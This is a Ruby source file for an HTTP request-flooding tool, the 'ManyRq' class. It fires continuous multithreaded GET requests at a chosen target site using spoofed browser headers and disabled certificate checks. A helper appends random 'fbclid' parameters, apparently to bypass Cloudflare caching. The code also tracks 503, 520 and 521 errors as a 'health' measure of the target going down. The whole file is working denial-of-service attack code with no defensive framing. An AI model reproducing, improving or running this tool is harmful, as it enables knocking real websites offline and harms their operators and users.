require 'net/http'
require 'openssl'
require_relative 'Workers'
require_relative '../sites'


class ManyRq
	include Sites
	BrowserH = {
		'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36',
		'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		# 'accept-encoding' => 'gzip, deflate',
		'Accept-Language' => 'en-US,en;q=0.9,uk;q=0.8,ru;q=0.7',
		'Cache-Control' => 'no-cache',
	}

	attr :hub, :threads_n
	
	def initialize
		@hub = Hub.new
		@fires_count = 0
		@last_results = []
		@last_results_limit = 200
		@threads_n = 1
		@workers = Workers.new @threads_n
	end

	def set_target(name)
		@site_N = name
	end

	def reset_last_results
		@last_results.clear
	end

	def set_threads(n)
		n = 1 if n < 1  # 1 is minimum
		@workers.wait_when_done
		@threads_n = n
		@workers = Workers.new @threads_n
	end

	def fire
		uri = prepare_uri
		# puts uri

		# request
		server_ip = nil
		cache_status = nil
		_time_start = Time.now
		status = begin
			params = {
				use_ssl:true, 
				verify_mode:OpenSSL::SSL::VERIFY_NONE, 
				open_timeout:5,
				read_timeout:5
			}
			res = Net::HTTP.start(uri.host, params) do |http|
				server_ip = http.ipaddr rescue '?'
				http.get uri.request_uri, BrowserH
			end
			cache_status = res['cf-cache-status']
			res.code
		rescue Net::ReadTimeout, Net::OpenTimeout
			'timeout'
		rescue EOFError
			'err'
		rescue
			$stderr << $!.inspect
			$stderr << $@
			$!.class.to_s
		end
		ttime = Time.now - _time_start
		ms = (ttime*1000).round

		hit_res = {time_ms:ms, at:Time.now}
		# check response
		case status
			# PROTECTED
			# 301 = Moved Permanently
			# 302 = Found redirect
			# 304 = Not Modified (get from cache)
			when '301', '302', '304'
				color = 37
				hit_res[:ok] = true
			# OK
			when '200', '304'
				# if res.body.include? 'Retry for a live version'
				# 	status = 'cf cache'
				# 	$stderr << res.body
				# 	color = 35
				# 	hit_res[:ok] = false
				# else
					color = 32
					hit_res[:ok] = true
				# end
			# FILED
			# 503 = Service Unavailable
			# 520 = connection from Cloudflare was refused by the server
			# 521 = Web Server Is Down
			# 525 = SSL handshake failed
			when '503', '520', '521', '525'
				color = 31
				hit_res[:ok] = false
			when '404'
				if @f_404_is_hit
					color = 35
					hit_res[:ok] = false
				else
					color = 32
					hit_res[:ok] = true
				end
			# 'timeout', 'err' + unexpected errors
			else
				color = 35
				hit_res[:ok] = false
		end

		unless hit_res[:ok].nil?
			@last_results << hit_res
		end

		# keep lasn N records
		n = @last_results.size - @last_results_limit
		@last_results.shift n if n >0

		# output
		bar_len = (5*ttime).round   # 5o = 1s — o = 200ms
		plus = bar_len - 50  # 10s max
		if plus > 0
			bar_len = 50
			plus_part = "+#{plus}"
		end
		bar = "%-20s#{plus_part}" % ('o'*bar_len)
		ok_count = @last_results.count {|d| d[:ok] }
		ok_perc = (ok_count.to_f / @last_results.size * 100)
		time_ms_avarage = @last_results.map {|d| d[:time_ms] }.avrg.to_i
		@fires_count += 1

		# check page body
		# File.open 'page.html', 'wb' do |f|
		#   f.write res.body
		# end

		if color
			@hub.fire :fire_result, "\e[1;#{color}m#{bar}\e[m - #{ms} ms (#{res&.body&.length||0} B) - #{status} - #{server_ip} (cf:#{cache_status})"
		else
			@hub.fire :fire_result, "  \e[1;33m!!! unexpected status - #{status}\e[m" + ' '*50
		end
		# *ok is for last @last_results_limit
		@hub.fire :stats_update, "%.1f %% ok (total rq: #{@fires_count}) - #{@threads_n} thr" % ok_perc

		# -health
		data = {
			ok_perc:ok_perc,
			failed_perc: 100-ok_perc,
			time_ms_avarage: time_ms_avarage,
		}
		@hub.fire :health_update, data
	rescue KnownError
		@hub.fire :error, $!.to_s
		# top_log $!.to_s
		# cmd_do 'stop'
	end

	def start_in_thr
		stop
		@f_stopped = false
		@cur_thread = Thread.new do
			loop do
				break if @f_stopped
				Thread.stop if @f_paused
				@workers << -> do
					fire
				end
				sleep 0.5 if @workers.queue.size > @threads_n*2
			end
		end		
	end

	def stop
		@workers.stop
		@f_stopped = true
		@cur_thread&.kill
		@workers.wait_when_done
	end

	def fbclid
		'?fbclid=' + Digest::MD5.hexdigest(Time.now.to_f.to_s)
	end

	def pause_resume
		if @f_paused
			@f_paused = false
			@cur_thread&.run rescue nil
		else
			@f_paused = true
			@workers.stop
		end
	end

	def paused?
		@f_paused
	end
end